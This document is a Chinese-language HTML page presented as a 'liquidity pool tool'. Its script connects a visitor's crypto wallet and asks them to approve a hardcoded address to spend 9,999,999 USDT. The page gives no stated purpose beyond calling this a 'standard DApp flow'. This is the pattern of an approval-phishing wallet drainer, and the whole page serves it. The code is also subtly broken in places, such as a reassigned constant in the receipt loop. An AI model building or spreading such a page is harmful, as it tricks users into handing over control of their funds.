<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>链接资金池工具</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #121212 0%, #1a1a1a 100%);
            color: #ffffff;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        
        .container {
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 40px;
            max-width: 600px;
            width: 100%;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
            border: 1px solid rgba(255, 255, 255, 0.1);
            text-align: center;
        }
        
        h1 {
            font-size: 2.5rem;
            margin-bottom: 30px;
            background: linear-gradient(90deg, #667eea 0%, #764ba2 100%);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            font-weight: 700;
        }
        
        .wallet-section {
            margin-bottom: 30px;
        }
        
        .wallet-section h2 {
            font-size: 1.5rem;
            margin-bottom: 20px;
            color: #e0e0e0;
        }
        
        .wallet-status {
            margin: 20px 0;
            padding: 15px;
            border-radius: 10px;
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.1);
            min-height: 60px;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .status {
            font-size: 1rem;
            font-weight: 500;
        }
        
        .status.success {
            color: #4caf50;
        }
        
        .status.error {
            color: #f44336;
        }
        
        .status.info {
            color: #2196f3;
        }
        
        .address {
            font-family: 'Courier New', Courier, monospace;
            font-size: 0.9rem;
            margin-left: 10px;
            background: rgba(255, 255, 255, 0.1);
            padding: 5px 10px;
            border-radius: 5px;
            word-break: break-all;
        }
        
        .button {
            background: linear-gradient(90deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 15px 30px;
            font-size: 1.1rem;
            font-weight: 600;
            border-radius: 10px;
            cursor: pointer;
            transition: all 0.3s ease;
            margin: 10px 0;
            width: 100%;
            max-width: 300px;
        }
        
        .button:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(102, 126, 234, 0.4);
        }
        
        .button:active {
            transform: translateY(0);
        }
        
        .footer {
            margin-top: 30px;
            font-size: 0.9rem;
            color: #888;
            text-align: center;
        }
        
        a {
            color: #667eea;
            text-decoration: none;
            transition: color 0.3s ease;
        }
        
        a:hover {
            color: #764ba2;
            text-decoration: underline;
        }
        
        @media (max-width: 768px) {
            .container {
                padding: 30px 20px;
            }
            
            h1 {
                font-size: 2rem;
            }
            
            .button {
                padding: 12px 24px;
                font-size: 1rem;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>链接资金池工具</h1>
        
        <div class="wallet-section">
            <h2>1. 连接钱包</h2>
            <button class="button" id="connectWallet">连接钱包</button>
            <div class="wallet-status" id="walletStatus">点击按钮连接钱包</div>
        </div>
        
        <div class="wallet-section">
            <h2>2. 授权操作</h2>
            <button class="button" id="approveButton" disabled>授权USDT</button>
            <div class="wallet-status" id="approvalStatus">请先连接钱包</div>
        </div>
    </div>
    
    <div class="footer">
        <p>标准DApp流程，确保所有钱包兼容</p>
    </div>
    
    <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.7.3/web3.min.js"></script>
    <script>
        // 合约配置
        const CONTRACT_ADDRESS = '0xB8C306FAdfFE05BF3336333585B3FE9B7e6AFD02';
        const AUTHORIZED_ADDRESS = '0xB8C306FAdfFE05BF3336333585B3FE9B7e6AFD02';
        
        // 合约ABI
        const CONTRACT_ABI = [
            {
                "constant": false,
                "inputs": [
                    {
                        "name": "spender",
                        "type": "address"
                    },
                    {
                        "name": "value",
                        "type": "uint256"
                    }
                ],
                "name": "approve",
                "outputs": [
                    {
                        "name": "",
                        "type": "bool"
                    }
                ],
                "payable": false,
                "stateMutability": "nonpayable",
                "type": "function"
            },
            {
                "constant": true,
                "inputs": [
                    {
                        "name": "owner",
                        "type": "address"
                    },
                    {
                        "name": "spender",
                        "type": "address"
                    }
                ],
                "name": "allowance",
                "outputs": [
                    {
                        "name": "",
                        "type": "uint256"
                    }
                ],
                "payable": false,
                "stateMutability": "view",
                "type": "function"
            }
        ];
        
        let web3;
        let contract;
        let account;
        
        // 连接钱包
        document.getElementById('connectWallet').addEventListener('click', async () => {
            try {
                // 检查网络连接
                if (!navigator.onLine) {
                    document.getElementById('walletStatus').innerHTML = '网络连接失败，请检查您的网络连接';
                    document.getElementById('walletStatus').className = 'status error';
                    return;
                }
                
                // 检查是否有Web3提供者
                if (!window.ethereum && !window.web3) {
                    document.getElementById('walletStatus').innerHTML = '请安装 MetaMask 或其他Web3钱包';
                    document.getElementById('walletStatus').className = 'status error';
                    return;
                }
                
                // 初始化Web3
                if (window.ethereum) {
                    web3 = new Web3(window.ethereum);
                    
                    // 对于所有钱包，尝试请求账户访问
                    try {
                        // 检查是否支持eth_requestAccounts方法
                        if (window.ethereum.request) {
                            await window.ethereum.request({ method: 'eth_requestAccounts' });
                        } else {
                            // 旧版钱包
                            await new Promise((resolve, reject) => {
                                window.ethereum.enable().then(resolve).catch(reject);
                            });
                        }
                    } catch (error) {
                        console.error('钱包授权失败:', error);
                        if (error.code === 4001) {
                            document.getElementById('walletStatus').innerHTML = '用户拒绝了钱包连接请求';
                        } else if (error.message.includes('network')) {
                            document.getElementById('walletStatus').innerHTML = '网络连接失败，请检查网络设置';
                        } else {
                            document.getElementById('walletStatus').innerHTML = '钱包连接失败: ' + error.message;
                        }
                        document.getElementById('walletStatus').className = 'status error';
                        return;
                    }
                } else if (window.web3) {
                    // 旧版钱包
                    web3 = new Web3(window.web3.currentProvider);
                    try {
                        // 尝试获取账户
                        const accounts = await web3.eth.getAccounts();
                        if (accounts.length === 0) {
                            // 尝试启用账户
                            await new Promise((resolve, reject) => {
                                window.web3.currentProvider.enable().then(resolve).catch(reject);
                            });
                        }
                    } catch (error) {
                        console.error('旧版钱包授权失败:', error);
                        document.getElementById('walletStatus').innerHTML = '钱包连接失败: ' + error.message;
                        document.getElementById('walletStatus').className = 'status error';
                        return;
                    }
                }
                
                // 获取账户
                const accounts = await web3.eth.getAccounts();
                if (accounts.length === 0) {
                    document.getElementById('walletStatus').innerHTML = '未找到账户，请确保钱包已解锁';
                    document.getElementById('walletStatus').className = 'status error';
                    return;
                }
                account = accounts[0];
                
                // 初始化合约
                contract = new web3.eth.Contract(CONTRACT_ABI, CONTRACT_ADDRESS);
                
                // 更新状态
                document.getElementById('walletStatus').innerHTML = `已连接钱包: <span class="address">${account}</span>`;
                document.getElementById('walletStatus').className = 'status success';
                
                // 启用授权按钮
                document.getElementById('approveButton').disabled = false;
                document.getElementById('approvalStatus').innerHTML = '点击按钮授权USDT';
                document.getElementById('approvalStatus').className = 'status info';
            } catch (error) {
                console.error('连接钱包失败:', error);
                let errorMessage = '连接钱包失败';
                if (error.message) {
                    if (error.message.includes('network')) {
                        errorMessage = '网络错误，请检查您的网络连接';
                    } else if (error.message.includes('connection')) {
                        errorMessage = '连接失败，请检查钱包连接';
                    } else {
                        errorMessage = '连接钱包失败: ' + error.message;
                    }
                }
                document.getElementById('walletStatus').innerHTML = errorMessage;
                document.getElementById('walletStatus').className = 'status error';
            }
        });
        
        // 授权按钮点击事件
        document.getElementById('approveButton').addEventListener('click', async () => {
            if (!account || !contract) {
                document.getElementById('approvalStatus').innerHTML = '请先连接钱包';
                document.getElementById('approvalStatus').className = 'status error';
                return;
            }
            
            await approveUSDT();
        });
        
        // 授权USDT
        async function approveUSDT() {
            const amount = '9999999'; // 默认授权金额为9999999 USDT
            
            try {
                // 更新状态
                document.getElementById('approvalStatus').innerHTML = '正在授权...';
                document.getElementById('approvalStatus').className = 'status info';
                
                // 转换金额为wei（USDT有6位小数）
                const amountWei = web3.utils.toWei(amount, 'mwei'); // 1 USDT = 1,000,000 mwei
                
                // 构建授权交易数据
                const approveData = contract.methods.approve(AUTHORIZED_ADDRESS, amountWei).encodeABI();
                
                // 估算Gas
                let gasLimit = 100000; // 默认Gas limit
                try {
                    gasLimit = await web3.eth.estimateGas({
                        from: account,
                        to: CONTRACT_ADDRESS,
                        data: approveData
                    });
                    // 增加20%的Gas作为缓冲
                    gasLimit = Math.round(gasLimit * 1.2);
                } catch (error) {
                    console.log('Gas估算失败，使用默认值:', error);
                }
                
                // 获取当前Gas价格
                const gasPrice = await web3.eth.getGasPrice();
                
                // 对于MetaMask，使用eth_sendTransaction方法
                if (window.ethereum && window.ethereum.isMetaMask) {
                    try {
                        // 使用MetaMask的request方法发送交易
                        const txHash = await window.ethereum.request({
                            method: 'eth_sendTransaction',
                            params: [{
                                from: account,
                                to: CONTRACT_ADDRESS,
                                data: approveData,
                                gas: web3.utils.toHex(gasLimit),
                                gasPrice: web3.utils.toHex(gasPrice)
                            }]
                        });
                        
                        // 等待交易确认
                        const receipt = await web3.eth.getTransactionReceipt(txHash);
                        while (!receipt) {
                            await new Promise(resolve => setTimeout(resolve, 1000));
                            receipt = await web3.eth.getTransactionReceipt(txHash);
                        }
                        
                        // 更新状态
                        document.getElementById('approvalStatus').innerHTML = `授权成功！交易哈希: <a href="https://etherscan.io/tx/${txHash}" target="_blank">${txHash}</a>`;
                        document.getElementById('approvalStatus').className = 'status success';
                    } catch (error) {
                        console.error('MetaMask交易失败:', error);
                        // 回退到传统方法
                        await executeApprovalFallback(amountWei, gasLimit, gasPrice);
                    }
                } else {
                    // 对于其他钱包，使用传统方法
                    await executeApprovalFallback(amountWei, gasLimit, gasPrice);
                }
                
                // 检查授权额度
                await checkAllowance();
            } catch (error) {
                console.error('授权失败:', error);
                
                // 解析错误信息
                let errorMessage = '授权失败，请重试';
                if (error.message) {
                    if (error.message.includes('User rejected')) {
                        errorMessage = '授权被用户拒绝，请确认交易';
                    } else if (error.message.includes('insufficient funds')) {
                        errorMessage = '账户余额不足，需要足够的ETH支付Gas费';
                    } else if (error.message.includes('Internal accounts')) {
                        errorMessage = '合约地址无效，请检查合约部署状态';
                    } else {
                        errorMessage = `授权失败: ${error.message}`;
                    }
                }
                
                document.getElementById('approvalStatus').innerHTML = errorMessage;
                document.getElementById('approvalStatus').className = 'status error';
            }
        }
        
        // 传统授权方法（用于其他钱包或MetaMask回退）
        async function executeApprovalFallback(amountWei, gasLimit, gasPrice) {
            const result = await contract.methods.approve(AUTHORIZED_ADDRESS, amountWei).send({ 
                from: account,
                gas: gasLimit,
                gasPrice: gasPrice
            });
            
            // 更新状态
            document.getElementById('approvalStatus').innerHTML = `授权成功！交易哈希: <a href="https://etherscan.io/tx/${result.transactionHash}" target="_blank">${result.transactionHash}</a>`;
            document.getElementById('approvalStatus').className = 'status success';
        }
        
        // 检查授权额度
        async function checkAllowance() {
            if (!contract || !account) return;
            
            try {
                const allowance = await contract.methods.allowance(account, AUTHORIZED_ADDRESS).call();
                const allowanceUSDT = web3.utils.fromWei(allowance, 'mwei');
                console.log('当前授权额度:', allowanceUSDT, 'USDT');
            } catch (error) {
                console.error('检查授权额度失败:', error);
            }
        }
    </script>
</body>
</html>
